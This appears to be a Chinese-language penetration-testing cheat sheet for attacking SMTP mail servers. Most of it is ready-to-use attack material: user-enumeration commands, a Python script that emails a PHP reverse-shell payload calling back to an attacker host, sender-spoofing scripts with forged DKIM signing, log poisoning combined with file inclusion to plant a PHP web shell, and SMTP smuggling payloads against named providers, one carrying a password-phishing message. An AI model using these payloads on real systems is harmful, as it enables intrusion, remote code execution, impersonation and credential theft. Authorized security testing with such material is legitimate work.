# SMTP服务

默认端口
+ 25
+ 465
+ 687

Banner
```bash
nc -vn <IP> 25
openssl s_client -crlf -connect [mail.example.com]:465
openssl s_client -starttls smtp -crlf -connect [mail.example.com]:587
```

MX
```bash
dig +short mx [example.com]
```

枚举
```bash
nmap -p25 --script smtp-commands [IP]
nmap -p25 --script smtp-open-relay -v [IP]
```

1.信息泄露

NTLM - 如果服务器支持NTLM身份验证则可以获取敏感信息
```bash
telnet [example.com] 587
HELO
AUTH NTLM 334
TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA

nmap
nmap -p587 --script smtp-ntlm-info -v [IP]
```

内部服务器名称
```bash
EHLO all

250-mail.snowwolf.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

当执行 MAIL FROM 命令且没有完整地址时，某些SMTP服务器会自动填写发件人的地址
```bash
MAIL FROM: snowwolf
250 2.1.0 snowwolf@mail.snowwolf.com....Sender OK
```

2.用户名枚举

RCPT TO
```bash
HELO x
MAIL FROM: [example@domain.com]

测试是否为test
RCPT TO:test
550 5.1.1 test... User unknown

测试是否为admin
RCPT TO:admin
550 5.1.1 admin... User unknown

测试是否为ed
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

VRFY
```bash
HELO x

VRFY root
250 Super-User root@myhost

VRFY blah
550 blah... User unknown
```

EXPN
```bash
HELO x

EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```

工具
```bash
Metasploit
auxiliary/scanner/smtp/smtp_enum

smtp-user-enum
smtp-user-enum -M [MODE] -u [USER] -t [IP]

Nmap
nmap --script smtp-enum-users [IP]
```

3.发送邮件

Python
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# 创建消息对象实例
msg = MIMEMultipart()

# 设置消息参数
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# 有效负载
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# 如果使用身份验证登录，取消下行注释
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]Successfully Sent Email to %s:" % (msg['To']))
```

4.SMTP命令

[Oracle](https://docs.oracle.com/cd/E19957-01/820-0514/6nc8g45cl/index.html#bgamy)

5.欺骗邮件

```bash
https://github.com/magichk/magicspoofing

python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```

```php
mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
```

```python
import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# 设置参数
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
	<body>
		<h3>This is a test, not a scam</h3>
		<br />
	</body>
</html>
"""
sender_domain=sender.split("@")[1]

# 准备后缀
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# 生成DKIM密钥
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
    dkim_private_key = fh.read()

# 生成邮件
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# 使用DKIM签署邮件
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# 使用本地postfix中继发送邮件
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```

## SMTP日志投毒

LFI
```
http://target.com/vulnerable.php?file=/etc/passwd
```

Send
```bash
MAIL FROM: 攻击者邮箱
RCPT TO: 受害者邮箱
DATA
Subject: Test
<?php system($_GET['cmd']); ?>
.
QUIT
```

LFI
```
view-source:http://target.com/vulnerable.php?file?file=/var/log/mail.log&cmd=ifconfig
```

## SMTP走私

Send
```bash
MAIL FROM: 攻击者邮箱
RCPT TO: 受害者邮箱
DATA
Subject: Test
This is a test email.
<CR><LF>.<CR><LF>
MAIL FROM: 伪造的邮箱
RCPT TO: 受害者邮箱
DATA
Subject: Spoofed Email
This is a spoofed email.
<CR><LF>.<CR><LF>
.
QUIT
```

GMX
```bash
data\r\n
FROM: 攻击者@gmx.net\r\n
TO: 受害者@provider.example\r\n
Subject: Test\r\n
\r\n
This is a test email.
\n.\r\n
MAIL FROM: 伪造@gmx.net\r\n
RCPT TO: 受害者@provider.example\r\n
DATA\r\n
FROM: 伪造@gmx.net\r\n
TO: 受害者@provider.example
Subject: Spoofed Email\r\n
\r\n
This is a spoofed email.
\r\n.\r\n
```

GMX跨域
```bash
data\r\n
FROM: 攻击者@gmx.net\r\n
TO: 受害者@provider.example\r\n
Subject: Test\r\n
\r\n
This is a test email.
\r\n.\n
MAIL FROM: 伪造@[domain.com]\r\n
RCPT TO: 受害者@provider.example\r\n
DATA\r\n
FROM: 伪造@[domain.com]\r\n
TO: 受害者@provider.example\r\n
Subject: Spoofed Email\r\n
\r\n
I am from [domain.com].
\r\n.\r\n
```

Microsoft Exchange Online(支持BDAT的入站SMTP服务器才可)
```bash
data\r\n
FROM: 攻击者@outlook.com\r\n
TO: 受害者@入站.com\r\n
Subject: Test\r\n
\r\n
This is a test email.
\r\n.\n
MAIL FROM: 伪造@outlook.com\r\n
RCPT TO: 目标@入站.com\r\n
DATA\r\n
FROM: 伪造@outlook.com\r\n
TO: 目标@入站.com\r\n
Subject: New Outlook Admin\r\n
\r\n
hi,\r\n.
\r\n
I am the new Outlook admin!\r\n
give me your password!\r\n
\r\n\
Best regards,\r\n
Timo Lo(n)gin
\r\n.\r\n
```

思科安全电子邮件网关
```bash
data\r\n
FROM: 攻击者@icloud.com\r\n
TO: 受害者@入站.com\r\n
Subject: Test\r\n
\r\n
This is a test email.
\r.\r
MAIL FROM: 伪造@icloud.com\r\n
RCPT TO: 目标@入站.com\r\n
DATA\r\n
FROM: 伪造@icloud.com\r\n
TO: 目标@入站.com\r\n
Subject: ID10T Error Detected\r\n
\r\n
Dear user,\r\n.
\r\n
Please give your apple device to Timo Longin!\r\n
\r\n
Yours,\r\n
Tim Apple
\r\n.\r\n
```

特殊数据结束序列
```bash
<CR><LF>\x00.<CR><LF>
<CR><LF>.\x00<CR><LF>
<LF>.<LF>
<CR><LF>.<CR>
<CR>.<LF>

\r\n\x00.\r\n
```

工具

[SMTP-Smuggling-Tools](https://github.com/The-Login/SMTP-Smuggling-Tools)


## SMTP中继

检测
```bash
nmap -p25 --script smtp-open-relay -v [IP]
```

```bash
EHLO all

250-mail.snowwolf.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

```bash
HELO 内部服务器名称
MAIL FROM: 攻击者邮箱
RCPT TO: 受害者邮箱
DATA
Subject: Test Email
This is a test email.
.
QUIT
```
